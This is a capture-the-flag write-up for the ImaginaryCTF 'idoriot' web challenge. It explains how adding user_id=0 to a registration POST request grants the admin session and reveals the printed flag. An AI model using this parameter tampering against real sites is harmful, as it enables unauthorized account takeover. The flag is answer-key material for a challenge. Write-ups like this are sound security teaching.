### Description  
>Some idiot made this web site that you can log in to. The idiot even made it
in php. I dunno.

Challenge name indicates an [IDOR](https://portswigger.net/web-
security/access-control/idor) vulnerability. There's no source code, so let's
investigate [the site](http://idoriot.chal.imaginaryctf.org)

## Recon  
We are immediately greeted by a login screen. I would normally try some
default creds, SQLi etc but based on the challenge name, I decide to skip
straight to user registration.

I register `cat:cat` and see a message `Welcome, User ID: 154308130`.

The source code is also displayed on-screen.  
```php  
session_start();

// Check if user is logged in  
if (!isset($_SESSION['user_id'])) {  
   header("Location: login.php");  
   exit();  
}

// Check if session is expired  
if (time() > $_SESSION['expires']) {  
   header("Location: logout.php");  
   exit();  
}

// Display user ID on landing page  
echo "Welcome, User ID: " . urlencode($_SESSION['user_id']);

// Get the user for admin  
$db = new PDO('sqlite:memory:');  
$admin = $db->query('SELECT * FROM users WHERE user_id = 0 LIMIT 1')->fetch();

// Check if the user is admin  
if ($admin['user_id'] === $_SESSION['user_id']) {  
   // Read the flag from flag.txt  
   $flag = file_get_contents('flag.txt');  
   echo "<h1>Flag</h1>";  
   echo "

$flag

";  
} else {  
   // Display the source code for this file  
   echo "<h1>Source Code</h1>";  
   highlight_file(__FILE__);  
}  
```

Accordingly, our goal is to gain access to the admin's account. If our
`$_SESSION['user_id']` matches that of the admin, we get the flag.

## Solution  
Tried to MD5 the user ID to see if matches the session value:
`5b2deaedb34c1bbd66856710f647c1db`.  
```bash  
echo -n "154308130" | md5sum  
87cd5ed599b872262ff865945845cd71  -  
```

No match, tried to register another user `cat2:cat2` and get `Welcome, User
ID: 275541975` with a session id `ef64cdce8f1247feb73ceddf86027774`.

Checking the registration login request, the user ID is specified.  
```js  
username=cat2&password=cat2&user_id=275541975  
```

Tried sending the registration request to burp's repeater.  
```js  
username=cat3&password=cat3&user_id=0  
```

The flag is displayed.  
```txt  
ictf{1ns3cure_direct_object_reference_from_hidden_post_param_i_guess}  
```

Original writeup (https://github.com/Crypto-
Cat/CTF/blob/main/ctf_events/imaginary_23/web/idoriot.md).